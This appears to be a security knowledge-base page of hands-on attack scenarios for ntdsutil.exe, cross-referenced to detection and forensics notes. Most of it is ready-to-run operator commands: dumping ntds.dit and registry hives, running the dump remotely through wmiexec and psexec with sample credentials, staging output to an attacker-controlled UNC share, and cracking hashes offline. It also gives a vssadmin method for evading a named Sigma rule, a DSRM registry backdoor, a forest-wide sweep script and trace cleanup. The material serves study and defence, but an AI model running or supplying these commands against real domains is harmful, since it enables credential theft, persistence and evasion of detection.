# LOLBins — ntdsutil.exe — Hands-On Use Cases

Every scenario below assumes the operator has **already obtained code execution on a Domain Controller** — `ntdsutil` itself has no remote client (see `01 - Overview.md`'s How It Works). What changes between scenarios is *how* that access was reached, which `ifm`/related submenu variant is used, and where the output ends up. MITRE ATT&CK technique(s) are tagged per scenario.

## Contents
- [Baseline On-Host IFM Extraction](#baseline-on-host-ifm-extraction)
- [Remote Invocation via a Chained Lateral-Movement Tool](#remote-invocation-via-a-chained-lateral-movement-tool)
- [Speed-Optimized Extraction for Mass/Ransomware-Precursor Use](#speed-optimized-extraction-for-massransomware-precursor-use)
- [Capturing SYSVOL Alongside the Database](#capturing-sysvol-alongside-the-database)
- [Staging Output to a Non-Standard or Exfil-Ready Path](#staging-output-to-a-non-standard-or-exfil-ready-path)
- [Chained Offline Hash Extraction with secretsdump.py](#chained-offline-hash-extraction-with-secretsdumppy)
- [Bypassing the "ifm" Detection Substring via Raw VSS](#bypassing-the-ifm-detection-substring-via-raw-vss)
- [The Defanged Variant Operators Avoid](#the-defanged-variant-operators-avoid)
- [DSRM Password Reset for a Persistent Backdoor Logon](#dsrm-password-reset-for-a-persistent-backdoor-logon)
- [Multi-DC / Forest-Wide Domain-Dominance Sweep](#multi-dc--forest-wide-domain-dominance-sweep)
- [Post-Attack Metadata Cleanup](#post-attack-metadata-cleanup)

---

## Baseline On-Host IFM Extraction

**MITRE ATT&CK:** [T1003.003](https://attack.mitre.org/techniques/T1003/003/) (OS Credential Dumping: NTDS)

The canonical LOLBAS-documented invocation, from an elevated command prompt on the DC itself (reached via RDP, console access, or an already-planted interactive shell):

```cmd
ntdsutil.exe "ac i ntds" "ifm" "create full c:\temp\ntdsdump" q q
```

Produces `C:\temp\ntdsdump\Active Directory\ntds.dit` and `C:\temp\ntdsdump\registry\SYSTEM` (and, per third-party corroboration cited in `01`, a `SAM` hive alongside it) — a complete, self-consistent, offline-crackable snapshot of every account's credential material domain-wide, taken without stopping NTDS and without any `lsass.exe` interaction.

## Remote Invocation via a Chained Lateral-Movement Tool

**MITRE ATT&CK:** T1003.003, plus whichever access technique got the operator onto the DC — e.g. [T1021.006](https://attack.mitre.org/techniques/T1021/006/) (WinRM), [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (SMB/Windows Admin Shares, for `psexec.py`), or [T1047](https://attack.mitre.org/techniques/T1047/) (WMI, for `wmiexec.py`)

Since `ntdsutil` has no network component, "remote use" always means running it locally on the DC *through* a different tool. Three realistic chains:

```powershell
# WinRM / PowerShell Remoting — operator already holds DC-admin-equivalent creds
Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
    ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ifm" q q
}
```

```bash
# Impacket wmiexec.py — see Impacket/wmiexec/02 - Hands-On Use Cases.md for the full mechanics
wmiexec.py -silentcommand CORP/administrator:'Summer2026!'@dc01.corp.local \
  'ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ifm" q q'
```

```bash
# Impacket psexec.py — see Impacket/psexec/02 - Hands-On Use Cases.md
psexec.py CORP/administrator:'Summer2026!'@dc01.corp.local \
  'cmd /c ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ifm" q q'
```

The `-silentcommand` wmiexec variant is a common operator pairing here specifically because it avoids leaving the wmiexec output-relay file (`01 - Overview.md` of `Impacket/wmiexec/`) *and* runs `ntdsutil.exe` as a direct `WmiPrvSE.exe` child rather than under a `cmd.exe` intermediary — stacking two evasion layers from two different tools on top of each other.

## Speed-Optimized Extraction for Mass/Ransomware-Precursor Use

**MITRE ATT&CK:** T1003.003

```cmd
ntdsutil.exe "ac i ntds" "ifm" "create full nodefrag C:\Windows\Temp\ifm" q q
```

Skips the ESE offline-defragmentation pass Microsoft's own docs describe as part of the default `create full` path — meaningfully reduces time-on-target on a large `ntds.dit` (a common concern for an operator racing to finish domain-dominance steps before detection, e.g. immediately ahead of a ransomware deployment phase), at the cost of a larger, non-defragmented output file.

## Capturing SYSVOL Alongside the Database

**MITRE ATT&CK:** T1003.003, plus [T1552.006](https://attack.mitre.org/techniques/T1552/006/) (Unsecured Credentials: Group Policy Preferences) if a legacy `cpassword`-bearing GPP XML file is present in the captured SYSVOL content

```cmd
ntdsutil.exe "ac i ntds" "ifm" "create sysvol full D:\staging\ifm" q q
```

One pull captures `ntds.dit`, the `SYSTEM`/`SAM` hives, and SYSVOL's full content (GPO logon/startup scripts, Group Policy Preferences XML) in a single operation — useful when the operator wants both the credential database and any script-embedded secrets or legacy GPP credential material an environment hasn't fully remediated.

## Staging Output to a Non-Standard or Exfil-Ready Path

**MITRE ATT&CK:** T1003.003, plus [T1074.002](https://attack.mitre.org/techniques/T1074/002/) (Data Staged: Remote Data Staging) if the output path is itself a remote/UNC share, or [T1074.001](https://attack.mitre.org/techniques/T1074/001/) (Local Data Staging) if staged locally ahead of a separate exfil step

```cmd
:: Direct to an attacker-writable UNC share
ntdsutil.exe "ac i ntds" "ifm" "create full \\10.10.10.50\loot$\ifm" q q

:: Or to removable media / a synced cloud-storage folder already present on the DC
ntdsutil.exe "ac i ntds" "ifm" "create full E:\ifm" q q
```

This is the exact variant `Windows/23 - Special Services/Domain Controller — Role-Specific Forensics.md`'s Step 7 flowchart treats as its **HIGH-concern branch**: `ifm`/`create full` output targeting a UNC share, removable media, or a cloud-sync folder rather than a local, backup-tooling-managed path — see that note for the full decision tree, not re-derived here.

## Chained Offline Hash Extraction with secretsdump.py

**MITRE ATT&CK:** T1003.003

```bash
# Once the operator has pulled the IFM output back to their own box
secretsdump.py -ntds "ntds.dit" -system "SYSTEM" LOCAL
```

`ntdsutil ifm` and `secretsdump.py`'s **offline mode** are complementary halves of the same workflow: `ntdsutil` produces the consistent on-host snapshot no live-DB copy could safely give you, and `secretsdump.py` does the actual decryption/hash-derivation work entirely offline, with zero further network contact. See `Impacket/secretsdump/02 - Hands-On Use Cases.md` for the full offline-mode walkthrough — not re-derived here, since the mechanics from that point forward are identical regardless of how the `ntds.dit`/`SYSTEM` pair was obtained.

## Bypassing the "ifm" Detection Substring via Raw VSS

**MITRE ATT&CK:** T1003.003, [T1564](https://attack.mitre.org/techniques/T1564/) (Hide Artifacts) — the deliberate-evasion variant

```cmd
vssadmin create shadow /for=C:
:: note the returned shadow-copy device path, then:
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\Windows\Temp\ntds.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Windows\Temp\SYSTEM
```

The **single most consequential OPSEC variant in this note**. LOLBAS's own published detection indicator is literally *"ntdsutil.exe with command line including 'ifm'"* (see `01 - Overview.md`), and the community Sigma rule for this technique (rule ID `2afafd61-6aae-4df4-baed-139fa1f4c345`, cited in full in `05 - Detection and Hunting.md`) matches on the `ntdsutil.exe` **process image alone**. Both are trivially defeated by never invoking `ntdsutil.exe` at all — `vssadmin.exe` (or a direct VSS API call from a custom tool) accomplishes the identical outcome. General VSS access mechanics (the `GLOBALROOT`/shadow-copy-device-path technique, `Get-CimInstance Win32_ShadowCopy`) are already covered in `Windows/19 - Anti-Forensics and Evidence Destruction.md § Volume Shadow Copy Analysis` and `Windows/23 - Special Services/Domain Controller — Role-Specific Forensics.md` Step 2 — not re-derived here.

## The Defanged Variant Operators Avoid

```cmd
ntdsutil.exe "ac i ntds" "ifm" "create rodc C:\Windows\Temp\ifm" q q
```

Included for completeness of the command surface, not as a realistic attack path: Microsoft's own `ifm` documentation states plainly that `ntdsutil` **strips cached secrets from RODC installation media** by design (the same protection an actual Read-Only Domain Controller gets). An operator who runs `create rodc`/`create sysvol rodc` instead of `create full`/`create sysvol full` — whether by mistake or because a scripted/templated command was copied from the wrong reference — walks away with a database that is missing the credential material they came for.

## DSRM Password Reset for a Persistent Backdoor Logon

**MITRE ATT&CK:** [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation) for the password reset itself; [T1556](https://attack.mitre.org/techniques/T1556/) (Modify Authentication Process) for the accompanying registry change

A separate abuse family from bulk credential theft — this one turns `ntdsutil` into a **persistence** mechanism rather than a one-time extraction tool. Every DC has a local Directory Services Restore Mode (DSRM) administrator account, set at promotion time and rarely rotated in practice:

```cmd
ntdsutil.exe "set dsrm password" "reset password on server null" q q
:: interactively prompts for the new DSRM password
```

By itself this only changes a password normally usable exclusively when the DC is booted into DSRM. Multiple independent security-research sources (SentinelOne, Splunk Security Content, and others; Microsoft's own [Restartable AD DS documentation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754718%28v=ws.10%29) confirms the registry entry's existence and general purpose, though its specific value semantics below are corroborated by these third-party sources rather than a single official Microsoft table) document that an attacker who additionally sets:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2 (REG_DWORD)
```

makes the DSRM local-administrator account usable for an **ordinary network logon at any time**, without needing to reboot the DC into DSRM first — a durable, domain-account-independent backdoor that survives a full credential reset of every actual AD account. This is the reason `Windows/Threat Landscape and Playbooks/Domain Credential Compromise (DCSync and NTDS.dit Theft) Playbook.md`'s Credential Reset sequence explicitly calls out resetting the DSRM password on every DC as a separate step from the domain-wide account-password rotation.

## Multi-DC / Forest-Wide Domain-Dominance Sweep

**MITRE ATT&CK:** T1003.003

```powershell
$dcs = @('dc01.corp.local','dc02.corp.local','dc03.child.corp.local')

foreach ($dc in $dcs) {
    Invoke-Command -ComputerName $dc -ScriptBlock {
        ntdsutil.exe "ac i ntds" "ifm" "create full nodefrag C:\Windows\Temp\ifm" q q
    }
}
```

Repeating the extraction across every reachable DC — including child-domain DCs the operator has separately obtained access to — is how a single `ifm` technique escalates from "one domain's credentials" to full **forest-wide** domain dominance, since each domain's `krbtgt` and account population is independent. `-nodefrag` is a common pairing here for the same time-on-target reasons as the mass-use case above.

## Post-Attack Metadata Cleanup

**MITRE ATT&CK:** [T1070](https://attack.mitre.org/techniques/T1070/) (Indicator Removal) — the closest general-purpose mapping found; no LOLBAS-specific or MITRE-specific technique entry naming `metadata cleanup` was located during this build, so treat this use case as a plausible capability of the tool rather than a heavily documented in-the-wild pattern

```cmd
ntdsutil.exe "metadata cleanup" "remove selected server RogueDC01" q q
```

`ntdsutil`'s `metadata cleanup` submenu exists to remove a decommissioned DC's leftover directory metadata after an improper (`dcpromo /forceremoval`) or failed demotion. The same command could plausibly be repurposed by an attacker to erase the directory footprint of a rogue or DCShadow-style transient replication partner (`Windows/23 - Special Services/Domain Controller — Role-Specific Forensics.md` Step 6) after it has already served its purpose — cleaning up `nTDSDSA`/site-topology objects that would otherwise corroborate the intrusion. This note flags the capability explicitly rather than asserting it as an observed technique, per this module's accuracy discipline.
